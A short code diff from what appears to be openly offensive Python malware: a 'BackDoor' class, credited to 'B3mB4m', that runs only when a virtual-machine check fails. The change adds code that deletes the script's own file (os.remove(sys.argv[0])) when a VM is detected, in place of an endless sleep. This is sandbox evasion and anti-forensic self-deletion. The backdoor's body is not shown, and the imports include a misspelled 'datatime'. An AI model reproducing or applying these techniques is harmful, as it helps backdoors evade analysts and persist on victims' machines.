@@ -12,6 +12,7 @@ import subprocess
 import socket
 import datatime
 import time
+import sys
 from VMsensor import TestVM
 
 #Coded by B3mB4m
@@ -66,5 +67,6 @@ class BackDoor(object):
 if TestVM().checkVirtualMachine() != True:
 	BackDoor().run() 
 else:
-	time.sleep(9999999) 
+	os.remove(sys.argv[0]) #much better :)
+	#time.sleep(9999999) 
   #RUN RUN RUN RUN !!
